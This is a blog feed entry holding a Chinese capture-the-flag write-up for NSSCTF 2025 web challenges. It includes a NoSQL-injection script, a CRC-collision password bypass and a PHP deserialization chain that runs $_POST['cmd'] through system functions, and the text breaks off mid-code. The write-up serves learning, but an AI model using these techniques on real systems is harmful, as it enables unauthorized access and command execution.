<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JG的个人博客</title>
  
  
  <link href="https://heisha123.github.io/atom.xml" rel="self"/>
  
  <link href="https://heisha123.github.io/"/>
  <updated>2025-08-25T09:30:16.668Z</updated>
  <id>https://heisha123.github.io/</id>
  
  <author>
    <name>JGwebre</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NSSCTF2025</title>
    <link href="https://heisha123.github.io/2025/08/23/JGCTF-8-WP/"/>
    <id>https://heisha123.github.io/2025/08/23/JGCTF-8-WP/</id>
    <published>2025-08-23T15:15:25.000Z</published>
    <updated>2025-08-25T09:30:16.668Z</updated>
    
    <content type="html"><![CDATA[<p>JGCTF-第8-WP</p><span id="more"></span><p><img src="/2025/08/23/JGCTF-8-WP/image1.png"></p><p>有没有PWN手MISC手救救我</p><p>单打独斗太难了</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h2><p>拿到附件分析源码</p><p>丢ai说存在NoSQL 注入漏洞</p><p>写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node8.anna.nssctf.cn:26824/search&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 NoSQL 注入 payload，返回所有书籍</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span>&#125;,  <span class="comment"># 匹配所有 title</span></span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;author&quot;</span>: &#123;<span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span>&#125;  <span class="comment"># 匹配所有 author</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"> resp = requests.post(url, json=payload, headers=headers)</span><br><span class="line"></span><br><span class="line"> books = resp.json()</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 筛选可能的 flag</span></span><br><span class="line"></span><br><span class="line"> flag_pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;NSSCTF\&#123;.*?\&#125;&quot;</span>, re.I)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> b <span class="keyword">in</span> books:</span><br><span class="line"></span><br><span class="line">  text = <span class="string">&quot; &quot;</span>.join([<span class="built_in">str</span>(b.get(<span class="string">&quot;title&quot;</span>,<span class="string">&quot;&quot;</span>)), <span class="built_in">str</span>(b.get(<span class="string">&quot;author&quot;</span>,<span class="string">&quot;&quot;</span>)), <span class="built_in">str</span>(b.get(<span class="string">&quot;description&quot;</span>,<span class="string">&quot;&quot;</span>))])</span><br><span class="line"></span><br><span class="line"> <span class="keyword">match</span> = flag_pattern.search(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line"></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;[+] Flag found:&quot;</span>, <span class="keyword">match</span>.group())</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Flag not found in returned data.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>, e)</span><br></pre></td></tr></table></figure><p><img src="/2025/08/23/JGCTF-8-WP/image2.png"></p><h2 id="EzCRC"><a href="#EzCRC" class="headerlink" title="EzCRC"></a>EzCRC</h2><p>思路很简单：<br>后端先比长度，再分别校验 CRC16 和 CRC8 是否与真口令一致，但不允许口令本身完全相等。所以我们只要构造一个与真口令长度相同、CRC16 与 CRC8 都相同但内容不同的字符串即可过关拿到 flag。</p><p>关键点：CRC 是线性的（按字节串行更新），固定前缀后，选择最后 3 个字节就能把两个 CRC 都“调回”到目标值。因此可以保留前 12 个字节不变，只改最后 3 个字节，做一个“双 CRC 碰撞”。</p><p>写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc16</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">  checksum = <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">    checksum ^= b</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> checksum &amp; <span class="number">1</span>:</span><br><span class="line">    </span><br><span class="line">        checksum = ((checksum &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        checksum &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> checksum &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_crc8</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">  crc8_table = [</span><br><span class="line"></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>,</span><br><span class="line"></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  crc = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">    crc = crc8_table[(crc ^ b) &amp; <span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> crc &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">SECRET_PASS = <span class="string">b&quot;Enj0yNSSCTF4th!&quot;</span></span><br><span class="line"></span><br><span class="line">target_crc16 = compute_crc16(SECRET_PASS)</span><br><span class="line"></span><br><span class="line">target_crc8 = calculate_crc8(SECRET_PASS)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Target CRC16:&quot;</span>, <span class="built_in">hex</span>(target_crc16))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Target CRC8 :&quot;</span>, <span class="built_in">hex</span>(target_crc8))</span><br><span class="line"></span><br><span class="line">prefix = SECRET_PASS[:-<span class="number">3</span>] <span class="comment"># 前 12 个字节固定，最后 3 个字节暴力枚举</span></span><br><span class="line"></span><br><span class="line">found = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> b2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    </span><br><span class="line">      candidate = prefix + <span class="built_in">bytes</span>([b1, b2, b3])</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> candidate == SECRET_PASS:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> compute_crc16(candidate) == target_crc16 <span class="keyword">and</span> calculate_crc8(candidate) == target_crc8:</span><br><span class="line">    </span><br><span class="line">        found = candidate</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found collision:&quot;</span>, candidate)</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hex:&quot;</span>, candidate.<span class="built_in">hex</span>())</span><br><span class="line">    </span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Not found&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/08/23/JGCTF-8-WP/image3.png"></p><p>计算出后直接提交</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node8.anna.nssctf.cn:24277/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;Enj0yNSSCTF4e\xa8-&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;pass&quot;</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="/2025/08/23/JGCTF-8-WP/image4.png"></p><h2 id="mpga-filesystem"><a href="#mpga-filesystem" class="headerlink" title="[mpga]filesystem"></a>[mpga]filesystem</h2><p>下载<a href="http://www.zip/">www.zip</a></p><p>拿到源码</p><p><img src="/2025/08/23/JGCTF-8-WP/image5.png"></p><p>存在反序列化</p><p>找利用链</p><p>FileManager::__toString() 会根据 $_POST[‘method’] 调用类内任意方法：</p><p>如果 targetFile 被设置为一个 ContentProcessor 对象 → 在 performWriteOperation($var) 中：这里访问了 $targetObject-&gt;$var → 触发 ContentProcessor::__get()。</p><p>ContentProcessor::__get() 又会调用：</p><p>如果 $this-&gt;callbackFunction 被设置为某个 系统函数名（如 system、exec、passthru），就会把 $_POST[‘cmd’] 当成命令执行。</p><p>FunctionInvoker::__call() 也允许通过对象属性调用任意函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$contextName</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;contextName = <span class="string">&#x27;ApplicationContext&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;contextName = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;contextName); &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$processedContent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>(); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;callbackFunction)) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 调用系统函数，执行 $_POST[&#x27;cmd&#x27;]</span></span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;callbackFunction&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$targetFile</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$targetFile</span> = <span class="literal">null</span></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;targetFile = <span class="variable">$targetFile</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterPath</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;targetFile))&#123;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;路径不合法&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    